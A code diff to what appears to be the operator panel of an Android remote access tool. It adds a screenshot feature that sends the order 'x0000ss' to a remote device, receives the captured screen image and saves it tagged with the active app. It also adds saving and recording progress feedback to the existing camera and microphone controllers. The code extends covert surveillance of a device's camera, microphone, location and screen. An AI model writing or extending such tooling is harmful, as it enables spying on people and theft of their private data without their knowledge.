@@ -45,6 +45,10 @@ app.config(function ($routeProvider) {
         .when("/location", {
             templateUrl: "./views/location.html",
             controller: "LocCtrl"
+        })
+        .when("/screenshot", {
+            templateUrl: "./views/screenshot.html",
+            controller: "ScreenshotCtrl"
         });
 });
 
@@ -151,13 +155,34 @@ app.controller("CamCtrl", function ($scope, $rootScope) {
             $camCtrl.$apply();
 
             $camCtrl.savePhoto = () => {
+                var btn = document.getElementById('savePhotoBtn');
+                var originalHtml = btn ? btn.innerHTML : '';
+
+                if (btn) {
+                    btn.innerHTML = '<i class="spinner loading icon"></i> Saving...';
+                    btn.classList.add('disabled');
+                }
+
                 $rootScope.Log('Saving picture..');
                 var picPath = path.join(downloadsPath, Date.now() + ".jpg");
                 fs.outputFile(picPath, new Buffer(base64String, "base64"), (err) => {
-                    if (!err)
+                    if (!err) {
                         $rootScope.Log('Picture saved on ' + picPath, CONSTANTS.logStatus.SUCCESS);
-                    else
+                        if (btn) {
+                            btn.innerHTML = '<i class="check icon"></i> Saved!';
+                            btn.classList.remove('disabled');
+                            btn.classList.add('green');
+                            setTimeout(() => { btn.innerHTML = originalHtml; btn.classList.remove('green'); }, 2000);
+                        }
+                    } else {
                         $rootScope.Log('Saving picture failed', CONSTANTS.logStatus.FAIL);
+                        if (btn) {
+                            btn.innerHTML = '<i class="close icon"></i> Failed';
+                            btn.classList.remove('disabled');
+                            btn.classList.add('red');
+                            setTimeout(() => { btn.innerHTML = originalHtml; btn.classList.remove('red'); }, 2000);
+                        }
+                    }
 
                 });
 
@@ -494,6 +519,32 @@ app.controller("MicCtrl", function ($scope, $rootScope) {
         if (seconds) {
             if (seconds > 0) {
                 $rootScope.Log('Recording ' + seconds + "'s...");
+
+                // UI Feedback
+                var btn = document.getElementById('recordBtn');
+                var prog = document.getElementById('recordProgress');
+                var label = document.getElementById('recordProgressLabel');
+
+                if (btn) {
+                    btn.classList.add('disabled');
+                    btn.innerHTML = '<i class="spinner loading icon"></i> Recording...';
+                }
+                if (prog) {
+                    prog.style.display = 'block';
+                    $(prog).progress({ percent: 0 });
+                }
+
+                // Countdown
+                var elapsed = 0;
+                var interval = setInterval(() => {
+                    elapsed++;
+                    var pct = Math.min((elapsed / seconds) * 100, 100);
+                    if (prog) $(prog).progress({ percent: pct });
+                    if (label) label.innerText = (seconds - elapsed) + 's remaining...';
+
+                    if (elapsed >= seconds) clearInterval(interval);
+                }, 1000);
+
                 socket.emit(ORDER, { order: mic, sec: seconds });
             } else
                 $rootScope.Log('Seconds must be more than 0');
@@ -506,6 +557,15 @@ app.controller("MicCtrl", function ($scope, $rootScope) {
     socket.on(mic, (data) => {
         if (data.file == true) {
             $rootScope.Log('Audio arrived', CONSTANTS.logStatus.SUCCESS);
+
+            // Reset UI
+            var btn = document.getElementById('recordBtn');
+            var prog = document.getElementById('recordProgress');
+            if (btn) {
+                btn.classList.remove('disabled');
+                btn.innerHTML = '<i class="photo icon"></i>Record'; // Reset text
+            }
+            if (prog) prog.style.display = 'none';
 
             var player = document.getElementById('player');
             var sourceMp3 = document.getElementById('sourceMp3');
@@ -523,13 +583,34 @@ app.controller("MicCtrl", function ($scope, $rootScope) {
             player.play();
 
             $MicCtrl.SaveAudio = () => {
+                var btn = document.getElementById('saveAudioBtn');
+                var originalHtml = btn ? btn.innerHTML : '';
+
+                if (btn) {
+                    btn.innerHTML = '<i class="spinner loading icon"></i> Saving...';
+                    btn.classList.add('disabled');
+                }
+
                 $rootScope.Log('Saving file..');
                 var filePath = path.join(downloadsPath, data.name);
                 fs.outputFile(filePath, data.buffer, (err) => {
-                    if (err)
+                    if (err) {
                         $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
-                    else
+                        if (btn) {
+                            btn.innerHTML = '<i class="close icon"></i> Failed';
+                            btn.classList.remove('disabled');
+                            btn.classList.add('red');
+                            setTimeout(() => { btn.innerHTML = originalHtml; btn.classList.remove('red'); }, 2000);
+                        }
+                    } else {
                         $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
+                        if (btn) {
+                            btn.innerHTML = '<i class="check icon"></i> Saved!';
+                            btn.classList.remove('disabled');
+                            btn.classList.add('green');
+                            setTimeout(() => { btn.innerHTML = originalHtml; btn.classList.remove('green'); }, 2000);
+                        }
+                    }
                 });
 
 
@@ -597,4 +678,64 @@ app.controller("LocCtrl", function ($scope, $rootScope) {
 
     });
 
+});
+
+// ==================== SCREENSHOT CONTROLLER ====================
+app.controller("ScreenshotCtrl", function ($scope, $rootScope) {
+    $screenshotCtrl = $scope;
+    $screenshotCtrl.screenshots = [];
+
+    $screenshotCtrl.takeScreenshot = () => {
+        $rootScope.Log('Sending screenshot command...', CONSTANTS.logStatus.DEFAULT);
+        socket.emit(ORDER, { order: 'x0000ss' });
+    };
+
+    $screenshotCtrl.clearScreenshots = () => {
+        $screenshotCtrl.screenshots = [];
+    };
+
+    $screenshotCtrl.saveScreenshot = (shot) => {
+        var base64Data = shot.url.replace(/^data:image\/jpeg;base64,/, "");
+        var fileName = "Screenshot_" + shot.app + "_" + Date.now() + ".jpg";
+        var filePath = path.join(downloadsPath, fileName);
+
+        fs.outputFile(filePath, base64Data, 'base64', (err) => {
+            if (err)
+                $rootScope.Log("Save failed: " + err, CONSTANTS.logStatus.FAIL);
+            else {
+                $rootScope.Log("Saved to " + filePath, CONSTANTS.logStatus.SUCCESS);
+            }
+        });
+    };
+
+    // Listen for screenshot data
+    var ssHandler = (data) => {
+        if (data.screenshot) {
+            $rootScope.Log('Screenshot received from ' + (data.app || 'Unknown'), CONSTANTS.logStatus.SUCCESS);
+
+            // Convert buffer to base64
+            var binary = '';
+            var bytes = new Uint8Array(data.buffer);
+            var len = bytes.byteLength;
+            for (var i = 0; i < len; i++) {
+                binary += String.fromCharCode(bytes[i]);
+            }
+            var base64 = window.btoa(binary);
+
+            $screenshotCtrl.screenshots.unshift({
+                url: 'data:image/jpeg;base64,' + base64,
+                app: data.app || 'Active App',
+                time: new Date(data.timestamp || Date.now()).toLocaleTimeString()
+            });
+            $screenshotCtrl.$apply();
+        }
+    };
+
+    // Check old listeners to avoid dupes
+    socket.off('x0000ss');
+    socket.on('x0000ss', ssHandler);
+
+    $scope.$on('$destroy', function () {
+        socket.off('x0000ss', ssHandler);
+    });
 });
